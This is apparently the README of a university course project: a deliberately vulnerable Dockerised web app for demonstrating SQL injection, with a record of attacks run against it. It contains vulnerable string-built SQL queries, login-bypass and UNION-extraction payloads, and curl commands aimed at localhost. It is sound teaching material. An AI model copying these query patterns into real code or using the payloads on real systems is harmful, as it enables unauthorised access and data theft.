# SQL Injection Demo - Phase 1 Complete

A deliberately vulnerable web application demonstrating SQL injection attacks, built for educational purposes in the Cybersecurity course.

## Project Structure

```
.
├── docker-compose.yml        # Docker orchestration
├── .env                       # Environment variables
├── database/
│   ├── init.sql              # Database schema & sample data
│   └── Dockerfile            # MySQL image with initialization
├── backend/
│   ├── app.js                # Express server with vulnerable endpoints
│   ├── db.js                 # Database connection
│   ├── routes/
│   │   ├── auth.js           # Login endpoint (vulnerable to logic-altering SQLi)
│   │   └── search.js         # Search endpoint (vulnerable to UNION-based SQLi)
│   ├── package.json
│   └── Dockerfile
└── frontend/
    ├── src/
    │   ├── App.js            # Main React component
    │   ├── components/
    │   │   ├── LoginForm.js   # Login page with injection demos
    │   │   └── SearchForm.js  # Search page with injection demos
    │   └── api/
    │       └── client.js      # Axios HTTP client
    ├── public/
    └── Dockerfile
```

## Getting Started

### Prerequisites

- Docker
- Docker Compose
- (Optional) Node.js 18+ for local development

### Running the Application

1. **Start all containers:**
   ```bash
   docker compose up --build
   ```

2. **Access the application:**
   - Frontend: http://localhost:3000
   - Backend API: http://localhost:5000
   - MySQL: localhost:3306

3. **Stop the application:**
   ```bash
   docker compose down
   ```

## Database

### Credentials
- Username: `sqli_user`
- Password: `demo_password`
- Database: `sqli_db`

### Test Users
| Username | Password | Role |
|----------|----------|------|
| admin | password123 | admin |
| user1 | user_pass | user |
| user2 | secure_pw | user |
| moderator | mod_secret | moderator |

## API Endpoints

### Authentication
- `POST /api/auth/login` - Login (vulnerable to logic-altering SQLi)
- `GET /api/auth/users` - Get all users

### Search
- `GET /api/search?query=<value>` - Search records (vulnerable to UNION-based SQLi)
- `GET /api/search/advanced?column=<col>&value=<value>` - Advanced search (double vulnerability)

## Vulnerable Code Examples

### Login Endpoint (auth.js)
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Attack:** `admin' OR '1'='1 --` in username field bypasses password check

### Search Endpoint (search.js)
```javascript
const query = `SELECT id, title, content FROM records WHERE title LIKE '%${query}%'`;
```

**Attack:** `' UNION SELECT id, secret_key, secret_value FROM secrets --` extracts secrets

## Phase 1 Deliverables

✅ Docker environment setup (docker-compose.yml, .env, .dockerignore)
✅ Database schema with 3 tables (users, records, secrets)
✅ Sample data for realistic demonstration
✅ Vulnerable backend API with Express
✅ React frontend with interactive UI
✅ Two vulnerable endpoints ready for Phase 2 attack demo
✅ Demo payload hints in frontend for testing

## Next Steps

**Phase 2:** Attack Demonstration
- Execute SQL injection payloads
- Document successful attacks
- Capture results and evidence

**Phase 3:** Defense Implementation
- Replace vulnerable code with prepared statements
- Implement input validation
- Re-run Phase 2 payloads to verify fixes

## Phase 2 Attack Demonstration (Executed)

The following attacks were executed against the running lab environment.

### Environment Status
- Frontend: `http://localhost:3000`
- Backend: `http://localhost:5000`
- MySQL host port: `3307` (container port `3306`)

### Attack Evidence Summary

| Test Case | Endpoint | Payload | Result |
|---|---|---|---|
| Login baseline | `POST /api/auth/login` | `username=admin`, `password=wrongpass` | `401` (failed login) |
| Login SQLi bypass | `POST /api/auth/login` | `username=admin' OR '1'='1 -- ` | `200` (logged in as `admin`) |
| Search baseline | `GET /api/search` | `query=Welcome` | `200`, no records |
| Search UNION SQLi | `GET /api/search` | `query=' UNION SELECT id, secret_key, secret_value FROM secrets -- ` | `200`, leaked rows from `secrets` |
| Advanced baseline | `GET /api/search/advanced` | `column=title`, `value=Project` | `200`, normal filtered row |
| Advanced SQLi (column injection) | `GET /api/search/advanced` | `column=title OR '1'='1' -- `, `value=x` | `200`, returned all records (filter bypass) |
| Advanced SQLi (UNION via value) | `GET /api/search/advanced` | `column=title`, `value=' UNION SELECT id, secret_key, secret_value, 'attacker', 1, NOW() FROM secrets -- ` | `200`, leaked `secrets` table data |

### Reproduction Commands

```bash
# 1) Login baseline (should fail)
curl -s -X POST http://localhost:5000/api/auth/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "username=admin" \
   --data-urlencode "password=wrongpass"

# 2) Login SQL injection bypass (should succeed)
curl -s -X POST http://localhost:5000/api/auth/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "username=admin' OR '1'='1 -- " \
   --data-urlencode "password=anything"

# 3) Basic search UNION extraction
curl -s -G http://localhost:5000/api/search \
   --data-urlencode "query=' UNION SELECT id, secret_key, secret_value FROM secrets -- "

# 4) Advanced search column injection (tautology)
curl -s -G http://localhost:5000/api/search/advanced \
   --data-urlencode "column=title OR '1'='1' -- " \
   --data-urlencode "value=x"

# 5) Advanced search UNION extraction with matching column count
curl -s -G http://localhost:5000/api/search/advanced \
   --data-urlencode "column=title" \
   --data-urlencode "value=' UNION SELECT id, secret_key, secret_value, 'attacker', 1, NOW() FROM secrets -- "
```

### Observed Sensitive Data Exposure

UNION-based SQL injection returned secret values such as:
- `api_key_payment`
- `api_key_cloud`
- `db_backup_password`
- `jwt_secret`
- `admin_api_token`

This confirms successful data exfiltration from a non-target table (`secrets`) and demonstrates high-impact SQL injection vulnerabilities.

## Important Notes

⚠️ **This is deliberately vulnerable code for educational purposes only.**
- Do NOT use these patterns in production
- This environment is isolated and safe for testing
- All vulnerabilities are intentional for learning

## Team

- Aaryan Agrawal (B23CS1002)
- Vyankatesh Deshpande (B23CS1079)
- Kanishk Singh Dayma (B23CS1024)
- Abhinash Roy (B23CS1003)

**Course:** Cybersecurity (CSL6010)
**Instructor:** Mohit Kumar Jangid
